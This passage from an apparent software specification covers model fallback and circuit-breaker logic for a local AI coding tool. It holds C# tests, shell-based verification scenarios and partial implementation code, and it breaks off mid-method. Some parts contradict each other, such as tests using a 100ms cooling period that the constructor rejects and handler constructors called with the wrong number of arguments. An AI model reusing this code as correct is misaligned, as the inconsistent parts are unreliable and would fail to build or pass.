        var role = AgentRole.Planner;
        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Unavailable,
            OperatingMode = OperatingMode.LocalOnly
        };

        _mockConfig.GetFallbackChain(role).Returns(new[] { "llama3.2:70b", "mistral:22b", "llama3.2:7b" });
        _mockRegistry.IsAvailable("llama3.2:70b").Returns(false);
        _mockRegistry.IsAvailable("mistral:22b").Returns(true);
        _mockRegistry.IsAvailable("llama3.2:7b").Returns(true);

        // Act
        var result = _sut.GetFallback(role, context);

        // Assert
        result.Success.Should().BeTrue();
        result.ModelId.Should().Be("mistral:22b");
        result.Reason.Should().Contain("llama3.2:70b unavailable");
    }

    [Fact]
    public void Should_Skip_Unavailable_Models()
    {
        // Arrange
        var role = AgentRole.Coder;
        var context = new FallbackContext
        {
            OriginalModel = "qwen2:14b",
            Trigger = EscalationTrigger.Unavailable,
            OperatingMode = OperatingMode.LocalOnly
        };

        _mockConfig.GetFallbackChain(role).Returns(new[] { "qwen2:14b", "llama3.2:7b", "mistral:7b" });
        _mockRegistry.IsAvailable("qwen2:14b").Returns(false);
        _mockRegistry.IsAvailable("llama3.2:7b").Returns(false);
        _mockRegistry.IsAvailable("mistral:7b").Returns(true);

        // Act
        var result = _sut.GetFallback(role, context);

        // Assert
        result.Success.Should().BeTrue();
        result.ModelId.Should().Be("mistral:7b");
        result.TriedModels.Should().Contain(new[] { "qwen2:14b", "llama3.2:7b", "mistral:7b" });
    }

    [Fact]
    public void Should_Use_Role_Chain_First()
    {
        // Arrange
        var role = AgentRole.Planner;
        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Timeout,
            OperatingMode = OperatingMode.LocalOnly
        };

        _mockConfig.GetFallbackChain(role).Returns(new[] { "llama3.2:70b", "mistral:22b" });
        _mockConfig.GetGlobalFallbackChain().Returns(new[] { "llama3.2:7b", "qwen2:7b" });
        _mockRegistry.IsAvailable("llama3.2:70b").Returns(false);
        _mockRegistry.IsAvailable("mistral:22b").Returns(true);

        // Act
        var result = _sut.GetFallback(role, context);

        // Assert
        result.ModelId.Should().Be("mistral:22b");
        _mockRegistry.DidNotReceive().IsAvailable("llama3.2:7b");
    }

    [Fact]
    public void Should_Fall_To_Global_Chain_When_Role_Chain_Empty()
    {
        // Arrange
        var role = AgentRole.Reviewer;
        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Unavailable,
            OperatingMode = OperatingMode.LocalOnly
        };

        _mockConfig.GetFallbackChain(role).Returns(Array.Empty<string>());
        _mockConfig.GetGlobalFallbackChain().Returns(new[] { "llama3.2:7b", "mistral:7b" });
        _mockRegistry.IsAvailable("llama3.2:7b").Returns(true);

        // Act
        var result = _sut.GetFallback(role, context);

        // Assert
        result.ModelId.Should().Be("llama3.2:7b");
    }

    [Fact]
    public void Should_Return_Failure_When_All_Models_Unavailable()
    {
        // Arrange
        var role = AgentRole.Planner;
        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Unavailable,
            OperatingMode = OperatingMode.LocalOnly
        };

        _mockConfig.GetFallbackChain(role).Returns(new[] { "llama3.2:70b", "mistral:22b", "llama3.2:7b" });
        _mockRegistry.IsAvailable(Arg.Any<string>()).Returns(false);

        // Act
        var result = _sut.GetFallback(role, context);

        // Assert
        result.Success.Should().BeFalse();
        result.Reason.Should().Contain("All fallbacks exhausted");
        result.TriedModels.Should().HaveCount(3);
    }
}
```

**File: Tests/Unit/Infrastructure/Fallback/CircuitBreakerTests.cs**

```csharp
using Xunit;
using FluentAssertions;
using Acode.Infrastructure.Fallback;

namespace Acode.Tests.Unit.Infrastructure.Fallback;

public class CircuitBreakerTests
{
    [Fact]
    public void Should_Track_Failures()
    {
        // Arrange
        var threshold = 5;
        var coolingPeriod = TimeSpan.FromSeconds(60);
        var sut = new CircuitBreaker(threshold, coolingPeriod);

        // Act
        sut.RecordFailure();
        sut.RecordFailure();

        // Assert
        sut.FailureCount.Should().Be(2);
        sut.State.Should().Be(CircuitState.Closed);
    }

    [Fact]
    public void Should_Open_After_Threshold()
    {
        // Arrange
        var threshold = 5;
        var coolingPeriod = TimeSpan.FromSeconds(60);
        var sut = new CircuitBreaker(threshold, coolingPeriod);

        // Act
        for (int i = 0; i < 5; i++)
        {
            sut.RecordFailure();
        }

        // Assert
        sut.State.Should().Be(CircuitState.Open);
        sut.ShouldAllow().Should().BeFalse();
    }

    [Fact]
    public void Should_Skip_Open_Circuit()
    {
        // Arrange
        var threshold = 3;
        var coolingPeriod = TimeSpan.FromSeconds(60);
        var sut = new CircuitBreaker(threshold, coolingPeriod);

        for (int i = 0; i < 3; i++)
        {
            sut.RecordFailure();
        }

        // Act
        var shouldAllow = sut.ShouldAllow();

        // Assert
        shouldAllow.Should().BeFalse();
        sut.State.Should().Be(CircuitState.Open);
    }

    [Fact]
    public void Should_Enter_HalfOpen_After_Cooling()
    {
        // Arrange
        var threshold = 3;
        var coolingPeriod = TimeSpan.FromMilliseconds(100);
        var sut = new CircuitBreaker(threshold, coolingPeriod);

        for (int i = 0; i < 3; i++)
        {
            sut.RecordFailure();
        }

        // Act
        Thread.Sleep(150); // Wait for cooling period
        var shouldAllow = sut.ShouldAllow();

        // Assert
        shouldAllow.Should().BeTrue();
        sut.State.Should().Be(CircuitState.HalfOpen);
    }

    [Fact]
    public void Should_Close_On_Success()
    {
        // Arrange
        var threshold = 5;
        var coolingPeriod = TimeSpan.FromSeconds(60);
        var sut = new CircuitBreaker(threshold, coolingPeriod);

        sut.RecordFailure();
        sut.RecordFailure();

        // Act
        sut.RecordSuccess();

        // Assert
        sut.State.Should().Be(CircuitState.Closed);
        sut.FailureCount.Should().Be(0);
    }

    [Fact]
    public void Should_Reset_Failure_Count_On_Success()
    {
        // Arrange
        var threshold = 5;
        var coolingPeriod = TimeSpan.FromSeconds(60);
        var sut = new CircuitBreaker(threshold, coolingPeriod);

        for (int i = 0; i < 4; i++)
        {
            sut.RecordFailure();
        }

        // Act
        sut.RecordSuccess();

        // Assert
        sut.FailureCount.Should().Be(0);
        sut.State.Should().Be(CircuitState.Closed);
    }
}
```

**File: Tests/Unit/Infrastructure/Fallback/EscalationPolicyTests.cs**

```csharp
using Xunit;
using FluentAssertions;
using NSubstitute;
using Acode.Infrastructure.Fallback;
using Acode.Application.Fallback;

namespace Acode.Tests.Unit.Infrastructure.Fallback;

public class EscalationPolicyTests
{
    [Fact]
    public void Should_Apply_Immediate_Policy()
    {
        // Arrange
        var mockModelProvider = Substitute.For<IModelProvider>();
        mockModelProvider.IsAvailable("llama3.2:70b").Returns(false);

        var policy = new ImmediatePolicy();
        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Unavailable
        };

        // Act
        var shouldFallback = policy.ShouldTriggerFallback(context, mockModelProvider);

        // Assert
        shouldFallback.Should().BeTrue();
        mockModelProvider.Received(1).IsAvailable("llama3.2:70b");
    }

    [Fact]
    public void Should_Retry_Then_Fallback()
    {
        // Arrange
        var mockModelProvider = Substitute.For<IModelProvider>();
        mockModelProvider.IsAvailable(Arg.Any<string>()).Returns(false);

        var retries = 2;
        var retryDelay = TimeSpan.FromMilliseconds(10);
        var policy = new RetryThenFallbackPolicy(retries, retryDelay);

        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Timeout
        };

        // Act
        var shouldFallback = policy.ShouldTriggerFallback(context, mockModelProvider);

        // Assert
        shouldFallback.Should().BeTrue();
        mockModelProvider.Received(3).IsAvailable("llama3.2:70b"); // Initial + 2 retries
    }

    [Fact]
    public void Should_Use_Circuit_Breaker_Policy()
    {
        // Arrange
        var mockModelProvider = Substitute.For<IModelProvider>();
        var circuitBreaker = new CircuitBreaker(3, TimeSpan.FromSeconds(60));
        var policy = new CircuitBreakerPolicy(circuitBreaker);

        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Unavailable
        };

        // Open the circuit
        for (int i = 0; i < 3; i++)
        {
            circuitBreaker.RecordFailure();
        }

        // Act
        var shouldFallback = policy.ShouldTriggerFallback(context, mockModelProvider);

        // Assert
        shouldFallback.Should().BeTrue();
        mockModelProvider.DidNotReceive().IsAvailable(Arg.Any<string>()); // Circuit open, no check
    }
}
```

### Integration Tests

**File: Tests/Integration/Fallback/FallbackIntegrationTests.cs**

```csharp
using Xunit;
using FluentAssertions;
using Microsoft.Extensions.DependencyInjection;
using Acode.Application.Fallback;
using Acode.Infrastructure.Fallback;
using Acode.Domain.Models;

namespace Acode.Tests.Integration.Fallback;

public class FallbackIntegrationTests : IClassFixture<FallbackIntegrationFixture>
{
    private readonly FallbackIntegrationFixture _fixture;

    public FallbackIntegrationTests(FallbackIntegrationFixture fixture)
    {
        _fixture = fixture;
    }

    [Fact]
    public async Task Should_Fallback_On_Unavailable()
    {
        // Arrange
        var handler = _fixture.ServiceProvider.GetRequiredService<IFallbackHandler>();
        await _fixture.StopModelAsync("llama3.2:70b"); // Make primary unavailable

        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Unavailable,
            OperatingMode = OperatingMode.LocalOnly
        };

        // Act
        var result = handler.GetFallback(AgentRole.Planner, context);

        // Assert
        result.Success.Should().BeTrue();
        result.ModelId.Should().Be("mistral:22b"); // First available fallback
        result.Reason.Should().Contain("llama3.2:70b unavailable");
    }

    [Fact]
    public async Task Should_Fallback_On_Timeout()
    {
        // Arrange
        var handler = _fixture.ServiceProvider.GetRequiredService<IFallbackHandler>();
        await _fixture.SlowDownModelAsync("llama3.2:70b", TimeSpan.FromSeconds(120));

        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Timeout,
            OperatingMode = OperatingMode.LocalOnly
        };

        // Act
        var result = handler.GetFallback(AgentRole.Planner, context);

        // Assert
        result.Success.Should().BeTrue();
        result.ModelId.Should().Be("mistral:22b");
        result.Reason.Should().Contain("timeout");
    }

    [Fact]
    public async Task Should_Recover_When_Available()
    {
        // Arrange
        var handler = _fixture.ServiceProvider.GetRequiredService<IFallbackHandler>();
        await _fixture.StopModelAsync("llama3.2:70b");

        // Open circuit
        for (int i = 0; i < 5; i++)
        {
            handler.NotifyFailure("llama3.2:70b", new Exception("Unavailable"));
        }

        handler.IsCircuitOpen("llama3.2:70b").Should().BeTrue();

        // Act - Restart model and wait for cooling
        await _fixture.StartModelAsync("llama3.2:70b");
        await Task.Delay(61000); // Wait for 60s cooling period

        var context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Unavailable,
            OperatingMode = OperatingMode.LocalOnly
        };

        var result = handler.GetFallback(AgentRole.Planner, context);

        // Assert
        handler.IsCircuitOpen("llama3.2:70b").Should().BeFalse();
    }
}
```

### E2E Tests

**File: Tests/E2E/Fallback/FallbackE2ETests.cs**

```csharp
using Xunit;
using FluentAssertions;
using Acode.CLI;
using Acode.Application.Fallback;

namespace Acode.Tests.E2E.Fallback;

public class FallbackE2ETests : IClassFixture<E2ETestFixture>
{
    private readonly E2ETestFixture _fixture;

    public FallbackE2ETests(E2ETestFixture fixture)
    {
        _fixture = fixture;
    }

    [Fact]
    public async Task Should_Continue_With_Fallback()
    {
        // Arrange
        await _fixture.ConfigureFallbackChainAsync(AgentRole.Planner, new[]
        {
            "llama3.2:70b",
            "mistral:22b",
            "llama3.2:7b"
        });

        await _fixture.StopModelAsync("llama3.2:70b");

        // Act
        var result = await _fixture.RunCommandAsync("acode plan 'Refactor authentication'");

        // Assert
        result.ExitCode.Should().Be(0);
        result.Output.Should().Contain("Fallback triggered");
        result.Output.Should().Contain("using mistral:22b");
        result.Output.Should().Contain("Plan:");
    }

    [Fact]
    public async Task Should_Fail_Gracefully_When_Exhausted()
    {
        // Arrange
        await _fixture.ConfigureFallbackChainAsync(AgentRole.Planner, new[]
        {
            "llama3.2:70b",
            "mistral:22b",
            "llama3.2:7b"
        });

        await _fixture.StopAllModelsAsync();

        // Act
        var result = await _fixture.RunCommandAsync("acode plan 'Refactor authentication'");

        // Assert
        result.ExitCode.Should().Be(1);
        result.Output.Should().Contain("All fallbacks exhausted");
        result.Output.Should().Contain("Tried: llama3.2:70b, mistral:22b, llama3.2:7b");
        result.Output.Should().Contain("Suggested actions:");
        result.Output.Should().Contain("ollama run llama3.2:7b");
    }

    [Fact]
    public async Task Should_Show_Fallback_Status()
    {
        // Arrange
        await _fixture.ConfigureFallbackChainAsync(AgentRole.Planner, new[] { "llama3.2:70b", "mistral:22b" });

        // Act
        var result = await _fixture.RunCommandAsync("acode fallback status");

        // Assert
        result.ExitCode.Should().Be(0);
        result.Output.Should().Contain("Fallback Configuration:");
        result.Output.Should().Contain("Policy: retry-then-fallback");
        result.Output.Should().Contain("Role Chains:");
        result.Output.Should().Contain("planner:");
        result.Output.Should().Contain("1. llama3.2:70b");
        result.Output.Should().Contain("2. mistral:22b");
        result.Output.Should().Contain("Circuit Breaker State:");
    }
}
```

### Performance Tests

**File: Tests/Performance/Fallback/FallbackPerformanceTests.cs**

```csharp
using Xunit;
using FluentAssertions;
using BenchmarkDotNet.Attributes;
using BenchmarkDotNet.Running;
using Acode.Application.Fallback;
using Acode.Infrastructure.Fallback;

namespace Acode.Tests.Performance.Fallback;

[MemoryDiagnoser]
public class FallbackPerformanceBenchmarks
{
    private IFallbackHandler _handler;
    private FallbackContext _context;

    [GlobalSetup]
    public void Setup()
    {
        var mockRegistry = Substitute.For<IModelProviderRegistry>();
        var mockConfig = Substitute.For<IFallbackConfiguration>();

        mockConfig.GetFallbackChain(Arg.Any<AgentRole>()).Returns(new[] { "llama3.2:70b", "mistral:22b", "llama3.2:7b" });
        mockRegistry.IsAvailable("llama3.2:70b").Returns(false);
        mockRegistry.IsAvailable("mistral:22b").Returns(true);

        _handler = new FallbackHandler(mockRegistry, mockConfig);
        _context = new FallbackContext
        {
            OriginalModel = "llama3.2:70b",
            Trigger = EscalationTrigger.Unavailable,
            OperatingMode = OperatingMode.LocalOnly
        };
    }

    [Benchmark]
    public void Fallback_Selection_Benchmark()
    {
        // PERF-001: Fallback selection < 10ms
        var result = _handler.GetFallback(AgentRole.Planner, _context);
        result.Success.Should().BeTrue();
    }

    [Fact]
    public void Fallback_Selection_Should_Complete_Under_10ms()
    {
        // Arrange
        var stopwatch = System.Diagnostics.Stopwatch.StartNew();

        // Act
        for (int i = 0; i < 1000; i++)
        {
            var result = _handler.GetFallback(AgentRole.Planner, _context);
        }

        stopwatch.Stop();

        // Assert
        var avgTime = stopwatch.ElapsedMilliseconds / 1000.0;
        avgTime.Should().BeLessThan(10);
    }
}

[MemoryDiagnoser]
public class CircuitBreakerPerformanceBenchmarks
{
    private CircuitBreaker _circuitBreaker;

    [GlobalSetup]
    public void Setup()
    {
        _circuitBreaker = new CircuitBreaker(5, TimeSpan.FromSeconds(60));
    }

    [Benchmark]
    public void Circuit_Check_Benchmark()
    {
        // PERF-002: Circuit check < 1ms
        var shouldAllow = _circuitBreaker.ShouldAllow();
    }

    [Fact]
    public void Circuit_Check_Should_Complete_Under_1ms()
    {
        // Arrange
        var stopwatch = System.Diagnostics.Stopwatch.StartNew();

        // Act
        for (int i = 0; i < 10000; i++)
        {
            var shouldAllow = _circuitBreaker.ShouldAllow();
        }

        stopwatch.Stop();

        // Assert
        var avgTime = stopwatch.Elapsed.TotalMilliseconds / 10000.0;
        avgTime.Should().BeLessThan(1);
    }
}

public class AvailabilityCheckTimeoutTests
{
    [Fact]
    public async Task Availability_Check_Should_Timeout_At_5s()
    {
        // PERF-003: Availability timeout 5s
        // Arrange
        var mockProvider = Substitute.For<IModelProvider>();
        mockProvider.IsAvailable(Arg.Any<string>())
            .Returns(async x =>
            {
                await Task.Delay(10000); // Simulate slow response
                return true;
            });

        var handler = new FallbackHandler(mockProvider, Substitute.For<IFallbackConfiguration>());
        var stopwatch = System.Diagnostics.Stopwatch.StartNew();

        // Act
        try
        {
            await handler.CheckAvailabilityAsync("llama3.2:70b");
        }
        catch (TimeoutException)
        {
            // Expected
        }

        stopwatch.Stop();

        // Assert
        stopwatch.ElapsedMilliseconds.Should().BeLessThan(5500); // 5s timeout + 500ms tolerance
        stopwatch.ElapsedMilliseconds.Should().BeGreaterThan(4500);
    }
}
```

### Regression Tests

**File: Tests/Regression/Fallback/FallbackRegressionTests.cs**

```csharp
using Xunit;
using FluentAssertions;
using Acode.Application.Fallback;
using Acode.Infrastructure.Fallback;

namespace Acode.Tests.Regression.Fallback;

public class FallbackRegressionTests
{
    [Fact]
    public void Should_Not_Fallback_When_Primary_Available()
    {
        // Regression: Ensure fallback doesn't trigger unnecessarily
        // Bug fixed in v1.2.0: Fallback triggered even when primary available

        // Arrange
        var mockRegistry = Substitute.For<IModelProviderRegistry>();
        var mockConfig = Substitute.For<IFallbackConfiguration>();

        mockRegistry.IsAvailable("llama3.2:70b").Returns(true);
        mockConfig.GetFallbackChain(AgentRole.Planner).Returns(new[] { "llama3.2:70b", "mistral:22b" });

        var handler = new FallbackHandler(mockRegistry, mockConfig);

        // Act - Primary model is available, should not fallback
        var needsFallback = handler.CheckIfFallbackNeeded("llama3.2:70b");

        // Assert
        needsFallback.Should().BeFalse();
    }

    [Fact]
    public void Should_Preserve_Circuit_State_Across_Multiple_Calls()
    {
        // Regression: Circuit state was lost between calls
        // Bug fixed in v1.3.0: Circuit state now persists in session

        // Arrange
        var circuitBreaker = new CircuitBreaker(3, TimeSpan.FromSeconds(60));

        // Act
        circuitBreaker.RecordFailure();
        circuitBreaker.RecordFailure();
        var failureCount1 = circuitBreaker.FailureCount;

        circuitBreaker.RecordFailure();
        var state = circuitBreaker.State;

        // Assert
        failureCount1.Should().Be(2);
        state.Should().Be(CircuitState.Open);
    }
}
```

---

## User Verification Steps

### Scenario 1: View Fallback Status

1. Configure fallback chain in `.agent/config.yml`:
   ```bash
   $ cat > .agent/config.yml << EOF
   models:
     fallback:
       global:
         - llama3.2:7b
       roles:
         planner:
           - llama3.2:70b
           - mistral:22b
   EOF
   ```

2. Run status command:
   ```bash
   $ acode fallback status
   ```

3. Verify output contains:
   - Fallback Configuration section
   - Global Chain showing llama3.2:7b
   - Role Chains showing planner chain
   - Circuit Breaker State for all models

### Scenario 2: Automatic Fallback on Unavailable Model

1. Start fallback model:
   ```bash
   $ ollama run mistral:22b
   ```

2. Stop primary model:
   ```bash
   $ killall ollama  # If llama3.2:70b was running
   $ ollama run mistral:22b  # Only fallback running
   ```

3. Make planning request:
   ```bash
   $ acode plan "Refactor authentication to support OAuth2"
   ```

4. Verify log shows fallback triggered:
   ```
   [WARN] Fallback triggered: llama3.2:70b unavailable, using mistral:22b
   ```

5. Verify plan is generated successfully using mistral:22b

### Scenario 3: Circuit Breaker Opens After Threshold

1. Configure circuit breaker in `.agent/config.yml`:
   ```yaml
   models:
     fallback:
       policy: circuit-breaker
       circuit_breaker:
         failure_threshold: 3
         cooling_period_ms: 30000
   ```

2. Trigger 3 consecutive failures (stop model, make 3 requests):
   ```bash
   $ killall ollama  # Stop all models
   $ acode plan "Test 1"  # Failure 1
   $ acode plan "Test 2"  # Failure 2
   $ acode plan "Test 3"  # Failure 3 → Circuit opens
   ```

3. Check circuit state:
   ```bash
   $ acode fallback status
   ```

4. Verify output shows:
   ```
   Circuit Breaker State:
     llama3.2:70b: OPEN (3 failures, cooling until HH:MM:SS)
   ```

### Scenario 4: Circuit Breaker Recovery After Cooling

1. With circuit open (from Scenario 3), wait for cooling period:
   ```bash
   $ sleep 31  # Wait 31 seconds (cooling period + 1s)
   ```

2. Start the model:
   ```bash
   $ ollama run llama3.2:70b
   ```

3. Make another request:
   ```bash
   $ acode plan "Test recovery"
   ```

4. Check circuit state:
   ```bash
   $ acode fallback status
   ```

5. Verify circuit is CLOSED:
   ```
   Circuit Breaker State:
     llama3.2:70b: CLOSED (0 failures)
   ```

### Scenario 5: Manual Circuit Reset

1. Open a circuit (trigger 3+ failures as in Scenario 3)

2. Run reset command for specific model:
   ```bash
   $ acode fallback reset --model llama3.2:70b
   Circuit breaker reset for llama3.2:70b
   ```

3. Verify circuit is closed:
   ```bash
   $ acode fallback status
   ```

4. Output should show:
   ```
   Circuit Breaker State:
     llama3.2:70b: CLOSED (0 failures)
   ```

### Scenario 6: Reset All Circuits

1. Open multiple circuits (stop all models, make requests for different roles)

2. Reset all circuits:
   ```bash
   $ acode fallback reset --all
   All circuit breakers reset.
   ```

3. Verify all circuits closed:
   ```bash
   $ acode fallback status
   ```

### Scenario 7: Fallback Chain Exhaustion

1. Configure fallback chain:
   ```yaml
   models:
     fallback:
       roles:
         planner:
           - llama3.2:70b
           - mistral:22b
           - llama3.2:7b
   ```

2. Stop all models:
   ```bash
   $ killall ollama
   $ killall vllm
   ```

3. Make planning request:
   ```bash
   $ acode plan "Refactor authentication"
   ```

4. Verify graceful error message:
   ```
   [ERROR] All fallbacks exhausted
     Role: planner
     Tried: llama3.2:70b, mistral:22b, llama3.2:7b
     Error: No available models

   Suggested actions:
     1. Start a model: ollama run llama3.2:7b
     2. Reset circuit breakers: acode fallback reset
     3. Check model server: ollama list
   ```

### Scenario 8: Test Fallback Chain

1. Start all models in chain:
   ```bash
   $ ollama run llama3.2:70b &
   $ ollama run mistral:22b &
   $ ollama run llama3.2:7b &
   ```

2. Test the chain:
   ```bash
   $ acode fallback test planner
   ```

3. Verify output shows latency for each model:
   ```
   Testing fallback chain for 'planner':
     llama3.2:70b: OK (45ms)
     mistral:22b: OK (38ms)
     llama3.2:7b: OK (32ms)
   Chain is healthy.
   ```

### Scenario 9: Role-Scoped vs Global Fallback

1. Configure both role-specific and global chains:
   ```yaml
   models:
     fallback:
       global:
         - llama3.2:7b
       roles:
         planner:
           - llama3.2:70b
           - mistral:22b
         coder: []  # Empty - will use global
   ```

2. Stop llama3.2:70b and mistral:22b:
   ```bash
   $ killall ollama
   $ ollama run llama3.2:7b  # Only global fallback running
   ```

3. Test planner (role-specific chain):
   ```bash
   $ acode plan "Test"
   ```

4. Verify error (role chain exhausted, doesn't fall to global):
   ```
   [ERROR] All fallbacks exhausted for role 'planner'
   ```

5. Test coder (uses global chain):
   ```bash
   $ acode code "Test"
   ```

6. Verify success (uses global llama3.2:7b):
   ```
   [INFO] Using model: llama3.2:7b (global fallback)
   ```

### Scenario 10: Retry-Then-Fallback Policy Behavior

1. Configure retry policy:
   ```yaml
   models:
     fallback:
       policy: retry-then-fallback
       retries: 2
       retry_delay_ms: 1000
       roles:
         planner:
           - llama3.2:70b
           - mistral:22b
   ```

2. Stop llama3.2:70b:
   ```bash
   $ killall ollama
   $ ollama run mistral:22b  # Only fallback running
   ```

3. Make request with logging enabled:
   ```bash
   $ acode plan "Test" --log-level debug
   ```

4. Verify logs show retry attempts:
   ```
   [DEBUG] Attempting llama3.2:70b (attempt 1/3)
   [DEBUG] Model unavailable, retrying in 1000ms
   [DEBUG] Attempting llama3.2:70b (attempt 2/3)
   [DEBUG] Model unavailable, retrying in 1000ms
   [DEBUG] Attempting llama3.2:70b (attempt 3/3)
   [DEBUG] Model unavailable, retries exhausted
   [WARN] Fallback triggered: llama3.2:70b unavailable after 2 retries, using mistral:22b
   ```

5. Verify total latency is approximately 2-3 seconds (2 retries × 1s delay)

---

## Implementation Prompt

### File Structure

```
src/AgenticCoder.Application/Fallback/
├── IFallbackHandler.cs
├── FallbackResult.cs
├── EscalationTrigger.cs
└── FallbackConfiguration.cs

src/AgenticCoder.Infrastructure/Fallback/
├── FallbackHandler.cs
├── CircuitBreaker.cs
├── ImmediatePolicy.cs
├── RetryPolicy.cs
├── CircuitBreakerPolicy.cs
└── FallbackChainResolver.cs
```

### IFallbackHandler Interface

```csharp
namespace AgenticCoder.Application.Fallback;

public interface IFallbackHandler
{
    FallbackResult GetFallback(AgentRole role, FallbackContext context);
    void NotifyFailure(string modelId, Exception error);
    bool IsCircuitOpen(string modelId);
    void ResetCircuit(string modelId);
    void ResetAllCircuits();
}

public sealed class FallbackResult
{
    public required bool Success { get; init; }
    public string? ModelId { get; init; }
    public required string Reason { get; init; }
    public IReadOnlyList<string>? TriedModels { get; init; }
}
```

### Domain Models

**File: src/Acode.Application/Fallback/FallbackResult.cs**

```csharp
namespace Acode.Application.Fallback;

/// <summary>
/// Result of fallback resolution attempt.
/// </summary>
public sealed class FallbackResult
{
    /// <summary>
    /// Indicates whether fallback was successful.
    /// </summary>
    public required bool Success { get; init; }

    /// <summary>
    /// ID of fallback model if successful, null otherwise.
    /// </summary>
    public string? ModelId { get; init; }

    /// <summary>
    /// Reason for fallback or failure.
    /// </summary>
    public required string Reason { get; init; }

    /// <summary>
    /// List of models tried during fallback resolution.
    /// </summary>
    public IReadOnlyList<string>? TriedModels { get; init; }
}
```

**File: src/Acode.Application/Fallback/FallbackContext.cs**

```csharp
namespace Acode.Application.Fallback;

/// <summary>
/// Context for fallback resolution.
/// </summary>
public sealed class FallbackContext
{
    /// <summary>
    /// Original model that failed.
    /// </summary>
    public required string OriginalModel { get; init; }

    /// <summary>
    /// Trigger that initiated fallback.
    /// </summary>
    public required EscalationTrigger Trigger { get; init; }

    /// <summary>
    /// Current operating mode for constraint validation.
    /// </summary>
    public required OperatingMode OperatingMode { get; init; }

    /// <summary>
    /// Optional error that caused escalation.
    /// </summary>
    public Exception? Error { get; init; }
}
```

**File: src/Acode.Application/Fallback/EscalationTrigger.cs**

```csharp
namespace Acode.Application.Fallback;

/// <summary>
/// Conditions that trigger fallback escalation.
/// </summary>
public enum EscalationTrigger
{
    /// <summary>
    /// Model server not responding (connection refused, DNS failure).
    /// </summary>
    Unavailable = 0,

    /// <summary>
    /// Model response exceeded configured timeout.
    /// </summary>
    Timeout = 1,

    /// <summary>
    /// Model returned errors repeatedly (malformed responses, 500-series codes).
    /// </summary>
    RepeatedErrors = 2
}
```

**File: src/Acode.Infrastructure/Fallback/CircuitState.cs**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Circuit breaker states.
/// </summary>
public enum CircuitState
{
    /// <summary>
    /// Normal operation, requests pass through.
    /// </summary>
    Closed = 0,

    /// <summary>
    /// Circuit open, model temporarily disabled.
    /// </summary>
    Open = 1,

    /// <summary>
    /// Testing recovery, one request allowed through.
    /// </summary>
    HalfOpen = 2
}
```

### CircuitBreaker Class

**File: src/Acode.Infrastructure/Fallback/CircuitBreaker.cs**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Circuit breaker implementation for model failure tracking.
/// </summary>
public sealed class CircuitBreaker
{
    private readonly object _lock = new();
    private int _failureCount;
    private DateTimeOffset _lastFailure;
    private CircuitState _state;
    private readonly int _threshold;
    private readonly TimeSpan _coolingPeriod;

    /// <summary>
    /// Current failure count.
    /// </summary>
    public int FailureCount
    {
        get { lock (_lock) return _failureCount; }
    }

    /// <summary>
    /// Current circuit state.
    /// </summary>
    public CircuitState State
    {
        get { lock (_lock) return _state; }
    }

    /// <summary>
    /// Last failure timestamp.
    /// </summary>
    public DateTimeOffset LastFailure
    {
        get { lock (_lock) return _lastFailure; }
    }

    public CircuitBreaker(int threshold, TimeSpan coolingPeriod)
    {
        if (threshold <= 0)
            throw new ArgumentOutOfRangeException(nameof(threshold), "Threshold must be > 0");

        if (coolingPeriod < TimeSpan.FromSeconds(5))
            throw new ArgumentOutOfRangeException(nameof(coolingPeriod), "Cooling period must be >= 5s");

        _threshold = threshold;
        _coolingPeriod = coolingPeriod;
        _state = CircuitState.Closed;
        _failureCount = 0;
        _lastFailure = DateTimeOffset.MinValue;
    }

    /// <summary>
    /// Records a failure. Opens circuit if threshold exceeded.
    /// </summary>
    public void RecordFailure()
    {
        lock (_lock)
        {
            _failureCount++;
            _lastFailure = DateTimeOffset.UtcNow;

            if (_failureCount >= _threshold)
            {
                _state = CircuitState.Open;
            }
        }
    }

    /// <summary>
    /// Records a success. Closes circuit and resets failure count.
    /// </summary>
    public void RecordSuccess()
    {
        lock (_lock)
        {
            _failureCount = 0;
            _state = CircuitState.Closed;
        }
    }

    /// <summary>
    /// Checks if circuit should allow requests through.
    /// </summary>
    /// <returns>True if request should be allowed, false if circuit is open.</returns>
    public bool ShouldAllow()
    {
        lock (_lock)
        {
            if (_state == CircuitState.Closed)
                return true;

            if (_state == CircuitState.Open &&
                DateTimeOffset.UtcNow - _lastFailure > _coolingPeriod)
            {
                _state = CircuitState.HalfOpen;
                return true;
            }

            return false;
        }
    }

    /// <summary>
    /// Manually resets circuit to closed state.
    /// </summary>
    public void Reset()
    {
        lock (_lock)
        {
            _failureCount = 0;
            _state = CircuitState.Closed;
            _lastFailure = DateTimeOffset.MinValue;
        }
    }
}
```

### FallbackHandler Implementation

**File: src/Acode.Infrastructure/Fallback/FallbackHandler.cs**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Handles model fallback escalation with circuit breaker pattern.
/// </summary>
public sealed class FallbackHandler : IFallbackHandler
{
    private readonly IModelProviderRegistry _registry;
    private readonly IFallbackConfiguration _config;
    private readonly ILogger<FallbackHandler> _logger;
    private readonly ConcurrentDictionary<string, CircuitBreaker> _circuits = new();

    public FallbackHandler(
        IModelProviderRegistry registry,
        IFallbackConfiguration config,
        ILogger<FallbackHandler> logger)
    {
        _registry = registry ?? throw new ArgumentNullException(nameof(registry));
        _config = config ?? throw new ArgumentNullException(nameof(config));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <inheritdoc/>
    public FallbackResult GetFallback(AgentRole role, FallbackContext context)
    {
        var chain = GetFallbackChain(role);
        var triedModels = new List<string>();

        foreach (var modelId in chain)
        {
            triedModels.Add(modelId);

            // Skip if circuit is open
